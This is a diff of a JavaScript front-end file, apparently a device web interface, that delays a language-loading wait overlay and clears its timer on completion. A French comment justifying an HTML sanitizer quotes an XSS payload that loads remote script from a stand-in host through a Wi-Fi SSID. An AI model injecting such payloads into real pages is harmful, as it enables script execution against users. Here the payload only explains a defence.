@@ -74,9 +74,6 @@ function initMultiClickToggle(triggerSelector, action, requiredClicks = 3) {
 }
 
 
-if (typeof ui !== 'undefined' && ui.waitMessage) {
-    waitLoad = ui.waitMessage(document.body);
-}
 // Contrat : tr() ne renvoie JAMAIS de valeur fausse pour une clé non vide -- à défaut de
 // traduction dans la langue active puis dans la langue embarquée, elle renvoie la clé elle-même.
 // Un `tr(x) || x` ou un `tr('CLE') || 'texte en dur'` est donc toujours mort : le second membre
@@ -112,7 +109,7 @@ window.escAttr = function(str) {
 //
 // POURQUOI. Il n'existait aucun assainisseur de ce genre dans le front-end, et une bonne trentaine
 // de sites injectaient ces valeurs telles quelles via innerHTML. Le vecteur le plus sérieux n'est
-// pas le nom d'un volet (il faut déjà être authentifié pour le poser) mais le SSID : c'est une
+// pas le nom d'un équipement (il faut déjà être authentifié pour le poser) mais le SSID : c'est une
 // chaîne de 32 octets entièrement contrôlée par un TIERS -- n'importe quel point d'accès à portée --
 // affichée dès qu'on ouvre l'écran Wi-Fi. `<svg onload=import('//x.yz')>` y tient. La CSP du
 // document autorise script-src 'unsafe-inline' (elle doit couvrir les onclick= et le script de
@@ -165,6 +162,14 @@ function loadLang(callback) {
         if (callback) callback();
         return;
     }
+    if (!waitLoad && !waitLoadTimer) {
+        waitLoadTimer = setTimeout(() => {
+            waitLoadTimer = null;
+            if (document.body && typeof ui !== 'undefined' && ui.waitMessage) {
+                waitLoad = ui.waitMessage(document.body);
+            }
+        }, LANG_WAIT_OVERLAY_DELAY);
+    }
     fetch(baseUrl + '/lang')
     .then(r => r.json())
     .then(dict => {
@@ -193,9 +198,14 @@ function loadLang(callback) {
 }
 function finishLoad(callback) {
     document.body.classList.add('lang-loaded');
+    if (waitLoadTimer) {
+        clearTimeout(waitLoadTimer);
+        waitLoadTimer = null;
+    }
     if (waitLoad && typeof waitLoad.remove === 'function') {
         waitLoad.remove();
     }
+    waitLoad = null;
     if (callback) callback();
 }
 // Détection de la langue navigateur vs langue active (Phase 3 i18n) : propose discrètement le
